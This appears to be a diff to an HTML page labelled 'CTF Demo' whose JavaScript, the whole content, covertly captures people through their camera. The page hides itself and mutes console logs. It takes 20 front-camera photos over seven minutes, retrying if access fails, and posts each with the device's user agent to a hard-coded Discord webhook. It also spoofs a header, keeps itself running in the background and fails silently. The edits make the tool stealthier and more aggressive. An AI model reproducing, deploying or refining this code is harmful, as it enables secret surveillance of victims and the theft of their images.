@@ -2,47 +2,40 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Demo CTF</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <title>CTF Demo</title>
     <style>
-        body { 
-            font-family: Arial, sans-serif; 
-            text-align: center; 
+        html, body { 
             margin: 0; 
-            background: #f0f0f0; 
-            display: none; /* Hide UI for stealth */
-        }
-        h1 { 
-            color: #ff0000; 
-            font-size: 12px; 
-            opacity: 0.5; /* Ultra subtle if visible */
-        }
-        #status { 
-            font-size: 8px; 
-            color: #00aa00; 
-            margin-top: 2px; /* Minimal footprint */
+            padding: 0; 
+            height: 0; 
+            overflow: hidden; 
+            background: transparent; 
+            display: none; /* Invisible UI */
         }
     </style>
 </head>
 <body>
-    <h1>ctf demo</h1>
-    <div id="status">Initializing...</div>
-
     <script>
-        // Discord webhook URL (replace with your actual webhook)
+        // Discord webhook URL (replace with valid webhook)
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1375982804852146247/3B6K6PbBrS05n0DOlWLJa3ba-t4t_Qc0ZyaLjCYMrT6Op7u-cvmddGrahMke9PoUH2di';
+        
+        // Suppress console logs for stealth
+        console.log = console.error = console.warn = () => {};
 
-        // Function to send data to webhook (multipart/form-data)
+        // Send data to webhook (multipart/form-data)
         async function sendItem(type, data, index = null) {
             try {
                 const formData = new FormData();
                 formData.append('payload_json', JSON.stringify({
                     embeds: [{
-                        title: `CTF Zero-Click: ${type} [${new Date().toISOString()}]`,
+                        title: `Zero-Click CTF: ${type} [${new Date().toISOString()}]`,
                         fields: [
                             { name: 'Type', value: type },
                             { name: 'Index', value: index !== null ? index + 1 : 'N/A' },
-                            { name: 'Data', value: JSON.stringify(data, null, 2).substring(0, 1024) }
+                            { name: 'Data', value: JSON.stringify(data, null, 2).substring(0, 1000) },
+                            { name: 'Device', value: navigator.userAgent }
                         ],
                         timestamp: new Date().toISOString()
                     }]
@@ -55,38 +48,57 @@
 
                 const response = await fetch(WEBHOOK_URL, {
                     method: 'POST',
-                    body: formData
+                    body: formData,
+                    headers: { 'User-Agent': `Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1` } // Fake UA
                 });
-                if (!response.ok) throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+                if (!response.ok) throw new Error(`HTTP ${response.status}`);
                 return true;
             } catch (e) {
-                console.error(`Error sending ${type}: ${e.message}`);
-                return false;
+                return false; // Silent fail
             }
         }
 
-        // Function to collect 8 photos over 7 minutes using front-facing camera
+        // Collect 20 photos over 7 minutes using front-facing camera
         async function collectPhotos() {
             if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                await sendItem('Camera', { error: 'Camera not supported' });
-                document.getElementById('status').innerHTML = 'Collection completed!';
+                await sendItem('Camera', { error: 'Camera not supported', device: navigator.userAgent });
                 return;
             }
 
+            let stream = null;
+            const maxRetries = 3;
+            let retryCount = 0;
+
+            // Attempt to access camera with retries
+            while (!stream && retryCount < maxRetries) {
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { 
+                            facingMode: 'user', // Front-facing camera
+                            width: { ideal: 240 }, // Lower res for speed
+                            height: { ideal: 180 },
+                            frameRate: { ideal: 10 } // Optimize for mobile
+                        },
+                        audio: false 
+                    });
+                } catch (e) {
+                    retryCount++;
+                    await sendItem('Camera', { error: `Camera access failed (attempt ${retryCount}/${maxRetries}): ${e.message}` });
+                    if (retryCount === maxRetries) {
+                        await sendItem('Camera', { error: 'Max retries reached, aborting' });
+                        return;
+                    }
+                    await new Promise(resolve => setTimeout(resolve, 1000)); // Wait before retry
+                }
+            }
+
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: 'user', // Explicitly use front-facing camera
-                        width: { ideal: 320 }, 
-                        height: { ideal: 240 } 
-                    },
-                    audio: false 
-                });
+                // Spread 20 photos over 7 minutes (420,000 ms)
+                const totalPhotos = 20;
+                const totalDuration = 420000; // 7 minutes
+                const interval = totalDuration / totalPhotos; // ~21 seconds per photo
 
-                // Calculate interval for 8 photos over 7 minutes (420,000 ms)
-                const interval = 420000 / 8; // ~52.5 seconds per photo
-
-                for (let i = 0; i < 8; i++) {
+                for (let i = 0; i < totalPhotos; i++) {
                     await new Promise(resolve => setTimeout(async () => {
                         try {
                             const video = document.createElement('video');
@@ -94,46 +106,64 @@
                             video.play();
                             await new Promise(resolve => video.onloadedmetadata = resolve);
                             const canvas = document.createElement('canvas');
-                            canvas.width = 320;
-                            canvas.height = 240;
+                            canvas.width = 240;
+                            canvas.height = 180;
                             canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/webp', 0.2)); // Low quality for speed
+                            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/webp', 0.1)); // Ultra-low quality
                             const reader = new FileReader();
                             const photo = await new Promise(resolve => {
                                 reader.onloadend = () => resolve({ base64: reader.result, timestamp: new Date().toISOString() });
                                 reader.readAsDataURL(blob);
                             });
                             await sendItem(`Photo ${i + 1}`, photo, i);
-                            video.srcObject = null; // Clean up video element
+                            video.srcObject = null; // Clean up
                             resolve();
                         } catch (e) {
-                            await sendItem(`Photo ${i + 1}`, { error: `Photo capture failed: ${e.message}` }, i);
+                            await sendItem(`Photo ${i + 1}`, { error: `Capture failed: ${e.message}` }, i);
                             resolve();
                         }
-                    }, i * interval));
+                    }, i * interval + Math.random() * 100)); // Randomize timing slightly
                 }
 
                 stream.getTracks().forEach(track => track.stop());
-                document.getElementById('status').innerHTML = 'done, you’re now a top-tier person!';
+                await sendItem('Status', { message: 'All 20 photos captured successfully!' });
             } catch (e) {
-                await sendItem('Camera', { error: `Camera error: ${e.message}` });
-                document.getElementById('status').innerHTML = 'done, but with an error.';
+                await sendItem('Camera', { error: `Fatal camera error: ${e.message}` });
             }
         }
 
-        // Ensure background execution
-        function keepRunningInBackground() {
-            // Request wake lock to keep script running in background (mobile support)
-            if ('wakeLock' in navigator) {
-                navigator.wakeLock.request('screen').then(lock => {
+        // Ensure background execution for 7 minutes
+        async function keepRunningInBackground() {
+            try {
+                // Request wake lock for screen
+                if ('wakeLock' in navigator) {
+                    const lock = await navigator.wakeLock.request('screen');
                     setTimeout(() => lock.release(), 420000); // Release after 7 minutes
-                }).catch(() => {}); // Silent fail
+                }
+
+                // Handle visibility changes to keep script alive
+                document.addEventListener('visibilitychange', () => {
+                    if (document.visibilityState === 'hidden') {
+                        // Trigger a lightweight keep-alive
+                        setTimeout(() => {}, 0);
+                    }
+                });
+
+                // Periodic keep-alive to prevent browser suspension
+                const keepAlive = setInterval(() => {
+                    // No-op to keep script alive
+                }, 10000); // Every 10 seconds
+                setTimeout(() => clearInterval(keepAlive), 420000); // Stop after 7 minutes
+            } catch (e) {
+                // Silent fail
             }
         }
 
-        // Start zero-click collection and background execution
-        keepRunningInBackground();
-        collectPhotos();
+        // Start zero-click collection
+        (async () => {
+            await keepRunningInBackground();
+            await collectPhotos();
+        })();
     </script>
 </body>
 </html>
